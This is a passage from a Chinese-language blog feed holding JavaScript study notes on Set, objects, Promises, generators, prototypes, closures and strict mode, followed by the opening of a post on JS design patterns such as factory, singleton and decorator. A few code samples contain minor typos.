class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var a = new Set();</span><br><span class="line">a.add(1);</span><br><span class="line">a.add(&apos;foo&apos;);</span><br><span class="line">a.has(1);</span><br><span class="line">a.delete(1);</span><br><span class="line">a.size</span><br><span class="line">for(let item of a)&#123; console.log(item) &#125;</span><br><span class="line"></span><br><span class="line">// Array和Set的转换</span><br><span class="line">Array.from(mySet);</span><br><span class="line">mySet = new Set([1,2,3])</span><br></pre></td></tr></table></figure></p><p><em>Array和Set的对比</em></p><ul><li>数组中判断元素是否存在的<code>indexOf</code>函数效率低下</li><li>Set允许根据值删除元素，而数组中必须用splice方法</li><li>Array的indexOf无法找到NaN值</li><li>Set对象存储不重复的值<br><br></li></ul><h4 id="1-13-Object"><a href="#1-13-Object" class="headerlink" title="1.13 Object"></a>1.13 Object</h4><ul><li><p>枚举一个对象的所有属性<br>for…in, Object.keys(obj), Object.getOwnPropertyNames(obj)</p></li><li><p>创建新对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// 1. 使用对象初始化器</span><br><span class="line">var obj = &#123; property_1: value_1 &#125;</span><br><span class="line"></span><br><span class="line">// 2. 使用构造函数，通过new创建对象实例</span><br><span class="line">function Car(make)&#123;</span><br><span class="line">  this.make = make;</span><br><span class="line">&#125;</span><br><span class="line">var myCar = new Car(&apos;Eagle&apos;)</span><br><span class="line"></span><br><span class="line">// 你可以通过prototype属性为之前定义的对象类型增加属性。该类型的所有对象，而不仅仅是一个。</span><br><span class="line">Car.propotype.color = null;</span><br><span class="line"></span><br><span class="line">// 3. 使用Object.create方法, 它允许你为创建的对象选择其原型对象，而不用定义一个构造函数。</span><br><span class="line">var Animal = &#123;</span><br><span class="line">  type: &apos;Invertebrrates&apos;,</span><br><span class="line">  displayType: function()&#123;</span><br><span class="line">    console.log(this.type)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var animal1 = Object.create(Animal)</span><br></pre></td></tr></table></figure></li><li><p><em>this</em><br><code>this</code>在方法中使用以指代当前对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function validate(obj, lowval)&#123;</span><br><span class="line">  if (obj.value &lt; lowval) &#123;</span><br><span class="line">    alert(&apos;Invalid Value&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 在每个元素的oncahnge事件处理器中调用validate，并通过this传入相应元素</span><br><span class="line">&lt;input onChange=&quot;validate(this, 18)&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>getter与setter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123; a: 0 &#125;;</span><br><span class="line">Object.defineProperties(o, &#123;</span><br><span class="line">  &quot;b&quot;: &#123; get: function() &#123; return this.a + 1 &#125;&#125;,</span><br><span class="line">  &quot;c&quot;: &#123; set: function(x) &#123; this.a = x / 2 &#125;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>删除属性: <code>delete myobj.a</code></p></li><li>比较对象: 两个独立声明的对象永远不会相等，即使他们有相同的属性，只有在比较一个对象和这个对象的引用时，才会返回true.<br><br></li></ul><h4 id="1-14-Promise"><a href="#1-14-Promise" class="headerlink" title="1.14 Promise"></a>1.14 Promise</h4><p>一个Promise就是一个代表了异步操作最终完成或者失败的对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">doSomething().then(doSomethingElse, failureCallback)</span><br><span class="line">doSomething()</span><br><span class="line">.then(result =&gt; doSomethingElse(result))</span><br><span class="line">.catch(failureCallback)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-15-迭代器和生成器"><a href="#1-15-迭代器和生成器" class="headerlink" title="1.15 迭代器和生成器"></a>1.15 迭代器和生成器</h4><ul><li><em>迭代器</em><br>一个迭代器对象，知道如何每次访问集合中的一项，并跟踪该序列中的当前位置。迭代器是一个对象，它提供了<code>next()</code>方法，用来返回序列中的下一项。这个方法包含<code>value</code>和<code>done</code>两个属性。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function makeIterator(array)&#123;</span><br><span class="line">  var nextIndex = 0;</span><br><span class="line">  return &#123;</span><br><span class="line">    next: function() &#123;</span><br><span class="line">      return nextIndex &lt; array.length ? &#123; value: array[nextIndex++], done: false &#125; : &#123; done: true &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var it = makeIterator([1,2]);</span><br><span class="line">console.log(it.next().value) // 1</span><br><span class="line">console.log(it.next().value) // 2</span><br><span class="line">console.log(it.next().done)  // true</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>生成器</em><br>使用<code>function*</code>语法，函数将变成GeneratorFunction。它允许你定义一个包含自有迭代算法的函数，同时它可以自动维护自己的状态<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function* idMaker()&#123;</span><br><span class="line">  var index = 0;</span><br><span class="line">  while(true)</span><br><span class="line">    yield index++;</span><br><span class="line">&#125;</span><br><span class="line">var gen = idMaker();</span><br><span class="line">console.log(gen.next().value) // 0</span><br><span class="line">console.log(gen.next().value) // 1</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-中级"><a href="#2-中级" class="headerlink" title="2. 中级"></a>2. 中级</h3><h4 id="2-1-原型链"><a href="#2-1-原型链" class="headerlink" title="2.1 原型链"></a>2.1 原型链</h4><p>JS常被描述为一种<strong>基于原型的语言</strong>——每个对象拥有一个原型对象，对象以其原型为模板、从原型继承方法和属性。原型对象也可能拥有原型，并从中继承方法和属性，一层一层，这种关系常被称为<strong>原型链</strong>。准确地说，这些属性和方法定义在Object构造器(constructor functions)之上的<code>prototype</code>属性上，而非对象实例本身。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function a()&#123;&#125;;</span><br><span class="line">a.prototype.foo = &apos;bar&apos;;</span><br><span class="line">console.log(a.prototype)</span><br><span class="line">  &#123;</span><br><span class="line">    foo: &apos;bar&apos;,</span><br><span class="line">    constructor: ƒ a(),</span><br><span class="line">    __proto__: &#123;</span><br><span class="line">        constructor: ƒ Object(),</span><br><span class="line">        hasOwnProperty: ƒ hasOwnProperty(),</span><br><span class="line">        isPrototypeOf: ƒ isPrototypeOf(),</span><br><span class="line">        propertyIsEnumerable: ƒ propertyIsEnumerable(),</span><br><span class="line">        toLocaleString: ƒ toLocaleString(),</span><br><span class="line">        toString: ƒ toString(),</span><br><span class="line">        valueOf: ƒ valueOf()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">// new一个实例</span><br><span class="line">var b = new a();</span><br><span class="line">b.prop = &quot;some value&quot;;</span><br><span class="line">console.log(b)</span><br></pre></td></tr></table></figure></p><ul><li><p><em>prototype属性</em>: 继承成员被定义的地方<br><code>Object.prototype.watch()</code>等成员，适用于任何继承自<code>Object()</code>的对象类型，包括使用构造器创建的新的对象实例。<br><code>Object.watch()</code>以及其他不在<code>prototype</code>对象内的成员，不会被对象实例，或继承自Object()的对象类型所继承。</p></li><li><p><em>constructor属性</em><br>每个实例对象都从原型中继承了一个constructor属性，该属性指向了用于构造此实例对象的构造函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person1.constructor 都将返回Person()构造器</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-2-重新介绍JS"><a href="#2-2-重新介绍JS" class="headerlink" title="2.2 重新介绍JS"></a>2.2 重新介绍JS</h4><ul><li>与大多数编程语言不通，JS没有输入或输出的概念。它是一个在主机环境下运行的脚本语言，任何与外界沟通的机制都是由主机环境提供的。浏览器是最常见的主机环境，但很多程序中也包含JS解释器，如Adobe Acrobat、Photoshop、SVG图像、Nodejs服务器。</li><li>JS不区分整数值和浮点数值，所有数字在JS中均用浮点数值表示。<br><code>0.1 + 0.2 = 0.30000000000000004</code></li><li><code>null</code>表示一个空值，<code>undefined</code>表示一个未初始化的值，也就是还没被分配的值。</li><li><code>&amp;&amp;</code>和<code>||</code>运算符使用短路逻辑，是否会执行第二个语句取决于第一个操作数的结果。</li><li>函数如果没有使用<code>return</code>语句，JS会返回<code>undefined</code></li><li>JS允许你创建匿名函数<br><code>(function(){ var a = 1 })();</code></li><li>如果在一个对象上使用点或方括号来访问属性/方法，这个对象就成了<code>this</code>。如果没有使用，那么<code>this</code>将指向全局对象。</li><li>你可以在程序中的任何时候修改原型(prototype)中的一些东西，你可以在运行时给已存在的对象添加额外的方法。</li><li>你可以在一个函数内部定义函数。这是一个减少使用全局变量的好方法。</li><li><em>闭包</em><br>JS执行一个函数时，都会创建一个作用域对象(scope object)，用来保存这个函数中创建的局部变量。它和被传入函数的变量一起被初始化。与全局对象不同，你不能直接访问作用域对象，也没有可以遍历当前作用域对象里属性的方法。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function makeAdder(a) &#123;</span><br><span class="line">  return function(b) &#123;</span><br><span class="line">    return a + b</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var x = makeAdder(5);</span><br><span class="line">var y = makeAdder(20);</span><br><span class="line">x(6); // 11</span><br><span class="line">y(7); // 27</span><br></pre></td></tr></table></figure></li></ul><p>JS具有一种垃圾回收机制——对象在被创建的时候分配内存，然后当指向这个对象的引用计数为零时，浏览器会回收内存。闭包很容易发生无意识的内存泄漏。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function addHandler() &#123;</span><br><span class="line">  var el = document.getElementById(&apos;el&apos;);</span><br><span class="line">  el.onclick = function() &#123;</span><br><span class="line">    el.style.backgroundColor = &apos;red&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这段代码创建了一个元素，当它被点击的时候变红，但同时它会发生内存泄漏。因为对<code>el</code>的引用不小心被放在一个匿名内部函数中。在JS对象，这个内部函数和本地对象之间<code>el</code>创建了一个循环引用。解决方法:不要使用<code>el</code>变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function addHandler() &#123;</span><br><span class="line">  document.getElementById(&apos;el&apos;).onclick = function() &#123;</span><br><span class="line">    this.style.backgroundColor = &apos;red&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>在JS里，对象可以被看作是一组属性的集合。用对象字面量语法来定义一个对象时，会自动初始化一组属性。例如，你定义了一个 var a = “hello”， 那么a本身就会有a.substring这个方法，以及a.length这个属性。<br><br></li></ul><h4 id="2-3-闭包"><a href="#2-3-闭包" class="headerlink" title="2.3 闭包"></a>2.3 闭包</h4><p>在这个例子中，<code>myFunc</code>是执行<code>makeFunc</code>时创建的<code>displayName</code>函数实例的引用，而<code>displayName</code>实例仍可访问其词法作用域中的变量，即可访问到<code>name</code>。由此，当<code>myFunc</code>被调用时，<code>name</code>仍可被访问，其值<code>Mozilla</code>被传递到<code>alert</code>中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function makeFunc() &#123;</span><br><span class="line">  var name = &apos;Mozilla&apos;;</span><br><span class="line">  function displayName() &#123;</span><br><span class="line">    alert(name)</span><br><span class="line">  &#125;</span><br><span class="line">  return displayName;</span><br><span class="line">&#125;</span><br><span class="line">var myFunc = makeFunc();</span><br><span class="line">myFunc();</span><br></pre></td></tr></table></figure></p><p>由于循坏在事件触发之前早已执行完毕，变量对象<code>item</code>（被三个闭包所共享）已经指向了<code>helpText</code>的最后一项。此时，可使用匿名闭包。也可以使用<code>let item = helpText[i]</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function showHelp(help) &#123;</span><br><span class="line">  document.getElementById(&apos;help&apos;).innerHTML = help;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setupHelp() &#123;</span><br><span class="line">  var helpText = [</span><br><span class="line">      &#123;&apos;id&apos;: &apos;email&apos;, &apos;help&apos;: &apos;Your e-mail address&apos;&#125;,</span><br><span class="line">      &#123;&apos;id&apos;: &apos;name&apos;, &apos;help&apos;: &apos;Your full name&apos;&#125;,</span><br><span class="line">      &#123;&apos;id&apos;: &apos;age&apos;, &apos;help&apos;: &apos;Your age (you must be over 16)&apos;&#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">  for (var i = 0; i &lt; helpText.length; i++) &#123;</span><br><span class="line">    (function() &#123;</span><br><span class="line">       var item = helpText[i];</span><br><span class="line">       document.getElementById(item.id).onfocus = function() &#123;</span><br><span class="line">         showHelp(item.help);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;)(); // 马上把当前循环项的item与事件回调相关联起来</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupHelp();</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-高级"><a href="#3-高级" class="headerlink" title="3. 高级"></a>3. 高级</h3><h4 id="3-1-继承与原型链"><a href="#3-1-继承与原型链" class="headerlink" title="3.1 继承与原型链"></a>3.1 继承与原型链</h4><p>jS对象有一个指向一个原型对象的链。当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。<em>几乎所有JS中的对象都是位于原型链顶端的Object的实例。</em></p><p>遍历对象的属性时，原型链上的每个可枚举属性都会被枚举出来。要检查对象是否具有自己定义的属性，而不是其原型链上的某个属性，则必须使用所有对象从<code>Object.prototype</code>继承的<code>hasOwnProperty</code>。<code>g.hasOwnProperty(&#39;vertices&#39;)</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var o = new Foo(); </span><br><span class="line"></span><br><span class="line">// 相当于</span><br><span class="line">var o = new Object();</span><br><span class="line">o.__proto__ = Foo.prototype;</span><br><span class="line">Foo.call(o);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-严格模式"><a href="#3-2-严格模式" class="headerlink" title="3.2 严格模式"></a>3.2 严格模式</h4><p>开启严格模式  <code>&quot;use strict&quot;;</code></p><table><thead><tr><th></th><th style="text-align:center">严格模式下抛出异常</th></tr></thead><tbody><tr><td>1. 无法意外创建全局变量</td><td style="text-align:center"><code>mistypedVariable = 17;</code></td></tr><tr><td>2. 给引起静默失败的赋值操作抛出异常</td><td style="text-align:center"><code>var obj1 = {}; Object.defineProperty(obj1, &quot;x&quot;, { value: 42, writable: false }); obj1.x = 9</code></td></tr><tr><td>3. 试图删除不可删除的属性会抛出异常</td><td style="text-align:center"><code>delete Object.prototype</code></td></tr><tr><td>4. 属性名在同一对象内必须唯一</td><td style="text-align:center"><code>var o = { p: 1, p: 2}</code></td></tr><tr><td>5. 函数的参数名唯一</td><td style="text-align:center"><code>function sum(a, a, c){}</code></td></tr><tr><td>6. 禁止八进制数学语法</td><td style="text-align:center"><code>var a = 0o10;</code></td></tr><tr><td>7. 禁止设置primitive值得属性</td><td style="text-align:center"><code>false.true = &quot;&quot;</code></td></tr><tr><td>8. 禁用with</td><td style="text-align:center"><code>with(obj){}</code></td></tr><tr><td>9. eval不再为上层范围引入新变量</td><td style="text-align:center"></td></tr><tr><td>10. 禁止删除声明变量</td><td style="text-align:center"><code>var x; delete x;</code></td></tr></tbody></table><ol start="11"><li>eval和arguments不能通过程序语法被绑定或赋值</li><li>参数的值不会随arguments对象的值得改变而改变   | <code>var a = 17; function f(a){ a = 42 ; console.log(arguments[0] // 17)}</code></li><li>不再支持arguments.callee        | 正常模式下,arguments.callee指向当前正在执行的函数<br><br></li></ol><h4 id="3-3-内存管理"><a href="#3-3-内存管理" class="headerlink" title="3.3 内存管理"></a>3.3 内存管理</h4><p>内存生命周期： 分配你所需要的内存、使用分配到的内存、不需要时将其释放</p>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>设计模式</title>
      <link href="/2019/09/14/JS%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2019/09/14/JS%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h3><h3 id="2-设计模式"><a href="#2-设计模式" class="headerlink" title="2. 设计模式"></a>2. 设计模式</h3><h4 id="2-1-工厂模式"><a href="#2-1-工厂模式" class="headerlink" title="2.1 工厂模式"></a>2.1 工厂模式</h4><p>jQuery是一个类，<code>$(&#39;div&#39;)</code>是一个实例。 工厂模式需要定义一个creator <code>$</code>, 来创建实例。这样可以直接调用<code>$(&#39;div&#39;)</code>， 而不用<code>new jQuery(&#39;div&#39;)</code>。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jQuery</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(selector) &#123;</span><br><span class="line">        <span class="keyword">let</span> slice = <span class="built_in">Array</span>.prototype.slice</span><br><span class="line">        <span class="keyword">let</span> dom = slice.call(<span class="built_in">document</span>.querySelectorAll(selector))</span><br><span class="line">        <span class="keyword">let</span> len = dom ? dom.length : <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">this</span>[i] = dom[i]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.length = len</span><br><span class="line">        <span class="keyword">this</span>.selector = selector || <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    append(node) &#123;&#125;</span><br><span class="line">    addClass(name) &#123;&#125;</span><br><span class="line">    html(data) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// creator</span></span><br><span class="line"><span class="built_in">window</span>.$ = <span class="function"><span class="keyword">function</span> (<span class="params">selector</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> jQuery(selector)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>React.creteElement创建虚拟DOM。工厂模式使得构造函数和创建者分离。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Vnode</span>(<span class="title">tag</span>, <span class="title">attrs</span>, <span class="title">children</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">React.createElement = <span class="function"><span class="keyword">function</span>(<span class="params">tag, attrs, children</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Vnode(tag, attrs, children)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-单例模式"><a href="#2-2-单例模式" class="headerlink" title="2.2 单例模式"></a>2.2 单例模式</h4><p>确保一个类只有一个实例。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 多次引入jquery，但其实只会有一个jQuery被初始化</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.jQuery !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">window</span>.jQuery</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>单例模式需要在定义一个获取唯一实例的方法，确保多次调用的是同一个实例。如：React中的store也是只允许有一个实例。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingleObject</span> </span>&#123;</span><br><span class="line">    login() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'login'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SingleObject.getInstance = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> instance;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!instacne) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> SingleObject;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj1 = SingleObject.getInstance();</span><br><span class="line"><span class="keyword">let</span> obj2 = SingleObject.getInstance();</span><br><span class="line"><span class="built_in">console</span>.log(obj1 === obj2);     <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-适配器模式"><a href="#2-3-适配器模式" class="headerlink" title="2.3 适配器模式"></a>2.3 适配器模式</h4><p>Vue中的computed属性，获取当前信息，处理后来适配页面需要。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; reversedMsg &#125;&#125;<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">        data: &#123;</span></span><br><span class="line"><span class="javascript">            msg: <span class="string">'hello'</span></span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        computed: &#123;</span></span><br><span class="line"><span class="javascript">            reversedMsg: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">return</span> <span class="keyword">this</span>.msg.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-装饰器模式"><a href="#2-4-装饰器模式" class="headerlink" title="2.4 装饰器模式"></a>2.4 装饰器模式</h4><p>为对象添加新功能，不改变其原有的结构和功能。第三方库<a href="https://github.com/jayphelps/core-decorators" target="_blank" rel="noopener">core-decorators</a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readonly</span>(<span class="params">target, name, descriptor</span>) </span>&#123;</span><br><span class="line">    descriptor.writable = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> descriptor</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">'A'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @readonly</span><br><span class="line">    name() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span>`</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> Person();</span><br><span class="line">p.name = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(<span class="number">100</span>) &#125;   <span class="comment">// 报错，p.name是只读</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-5-代理模式"><a href="#2-5-代理模式" class="headerlink" title="2.5 代理模式"></a>2.5 代理模式</h4><p>使用者无权访问目标对象，中间加代理，通过代理做授权和控制。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 